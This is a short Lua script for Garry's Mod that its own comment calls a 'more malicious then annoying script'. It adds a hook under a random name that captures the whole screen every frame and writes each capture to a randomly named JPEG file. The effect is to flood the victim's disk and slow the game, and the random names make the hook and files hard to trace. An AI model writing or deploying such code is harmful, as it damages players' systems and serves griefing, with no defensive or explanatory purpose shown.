-- habol with very few features, as its designed as a more malicious then annoying script

local function RandomString(length)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local generateRandomString = ""
    local charsCount = #chars

    for i = 1, length do
        local randomIndex = math.random(charsCount)
        generateRandomString = generateRandomString .. string.sub(chars, randomIndex, randomIndex)
    end

    return generateRandomString
end

hook.Add("Think",RandomString(20), function()

      local fucked = render.Capture({
    		format = "jpeg",
    		x = 0,
    		y = 0,
    		w = ScrW(),
    		h = ScrH(),
    		quality = "100"
    	})
    	file.Write(RandomString(30) .. ".jpeg", fucked)
  
end)
